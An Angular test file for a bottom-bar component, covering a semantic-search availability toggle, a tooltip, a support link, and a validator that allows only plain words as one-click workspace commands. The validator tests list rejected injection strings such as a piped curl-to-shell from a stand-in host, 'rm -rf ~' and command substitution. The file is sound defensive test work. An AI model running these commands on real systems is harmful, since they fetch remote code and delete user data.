import { signal } from '@angular/core';
import { BottomBarComponent, isSafeCommandWord } from './bottom-bar.component';

/**
 * Knowledge panel: packaged builds may have no embeddings runtime. The
 * Semantic tab must disappear (with a note) instead of answering every
 * search with an empty result that looks like "no matches".
 */
describe('BottomBarComponent semantic availability', () => {
  const proto = BottomBarComponent.prototype as any;

  function ctx(api: any) {
    const c: any = {
      knApi: api,
      knSemanticAvailable: signal(true),
      knSemanticResult: signal<any>({ chunks: [], summary: 'old' }),
      knTab: signal<'graph' | 'semantic' | 'impact' | 'memory'>('semantic'),
      knSemanticInput: signal('auth flow'),
      knSemanticSource: signal<'brief' | 'code'>('code'),
      knLoading: signal(false),
      knIndexing: signal<null | 'graph' | 'semantic'>(null),
      knBriefSearchAvailable: false,
      resolveWorkspacePath: () => '/ws',
      ensureSemanticIndexed: async () => {},
    };
    c.markSemanticUnavailable = proto.markSemanticUnavailable.bind(c);
    return c;
  }

  it('hides the Semantic tab when the build has no runtime', async () => {
    const c = ctx({ getSemanticStatus: async () => ({ available: false, unavailableReason: 'semantic_unavailable' }) });
    await proto.checkSemanticAvailable.call(c);
    expect(c.knSemanticAvailable()).toBeFalse();
    expect(c.knTab()).toBe('graph');
    expect(c.knSemanticResult()).toBeNull();
  });

  it('keeps the tab when the runtime is there or the status is unknown', async () => {
    const ok = ctx({ getSemanticStatus: async () => ({ available: true }) });
    await proto.checkSemanticAvailable.call(ok);
    expect(ok.knSemanticAvailable()).toBeTrue();
    const old = ctx({ getSemanticStatus: async () => ({ isReady: false }) });
    await proto.checkSemanticAvailable.call(old);
    expect(old.knSemanticAvailable()).toBeTrue();
    const failing = ctx({ getSemanticStatus: async () => { throw new Error('x'); } });
    await proto.checkSemanticAvailable.call(failing);
    expect(failing.knSemanticAvailable()).toBeTrue();
  });

  it('never shows an "unavailable" answer as an empty result', async () => {
    const c = ctx({ semanticSearch: async () => ({ unavailable: true, chunks: [], summary: '' }) });
    await proto.execKnSemanticSearch.call(c);
    expect(c.knSemanticAvailable()).toBeFalse();
    expect(c.knSemanticResult()).toBeNull();
    expect(c.knLoading()).toBeFalse();
  });

  it('shows real results', async () => {
    const res = { chunks: [{ file: 'a.ts' }], summary: 'a.ts', estimatedTokens: 10 };
    const c = ctx({ semanticSearch: async () => res });
    await proto.execKnSemanticSearch.call(c);
    expect(c.knSemanticAvailable()).toBeTrue();
    expect(c.knSemanticResult()).toBe(res);
  });
});

/** Workspace commands come from the repository on disk: only plain words become one-click commands. */
describe('BottomBarComponent workspace commands', () => {
  it('keeps real script names, make targets and script files', () => {
    for (const ok of ['build', 'build:prod', 'test-e2e', 'lint.fix', '@scope/x', 'deploy.sh', 'db_seed', 'a+b', 'x=1']) {
      expect(isSafeCommandWord(ok)).withContext(ok).toBeTrue();
    }
  });

  it('drops names that would run more than the person reads', () => {
    for (const bad of ['lint; curl evil.sh | sh', 'a && b', 'x\rrm -rf ~', 'x\u001b[2K', '$(id)', '`id`', 'a b', '-rf', '', 'x'.repeat(121), 'a\nb', 'a|b', 'a>b']) {
      expect(isSafeCommandWord(bad)).withContext(JSON.stringify(bad)).toBeFalse();
    }
    const proto = BottomBarComponent.prototype as any;
    expect(proto.safeWords(['dev', 'x; rm -rf ~', 'test'])).toEqual(['dev', 'test']);
    expect(proto.safeWords(undefined)).toEqual([]);
  });
});

/** The engine chips' tooltip: name and description are translation keys. */
describe('BottomBarComponent engine chip tooltip', () => {
  it('shows translated text, not the keys', () => {
    const proto = BottomBarComponent.prototype as any;
    const ctx = {
      fmtNum: proto.fmtNum,
      translate: { instant: (k: string) => ({ 'K.Name': 'Context Cache', 'K.Desc': 'Repeated reads avoided' } as any)[k] ?? k },
    };
    const tip = proto.chipTooltip.call(ctx, { key: 'used_cache', name: 'K.Name', description: 'K.Desc', icon: '', analytics: { tokensSaved: 1500 } });
    expect(tip).toBe('Context Cache · -1.5K tok\nRepeated reads avoided');
  });
});

/** Support has no in-app page in this edition: it opens the project's GitHub issues. */
describe('BottomBarComponent support link', () => {
  it('opens GitHub issues in the system browser', () => {
    const w = window as any;
    const prev = w.promptops;
    const opened: string[] = [];
    w.promptops = { openExternal: (u: string) => opened.push(u) };
    try {
      (BottomBarComponent.prototype as any).openSupport.call({});
      (BottomBarComponent.prototype as any).onMoreSelect.call({ openSupport: () => (BottomBarComponent.prototype as any).openSupport.call({}) }, 'support');
    } finally {
      w.promptops = prev;
    }
    expect(opened).toEqual(['https://github.com/shellonback/promptops/issues', 'https://github.com/shellonback/promptops/issues']);
  });
});
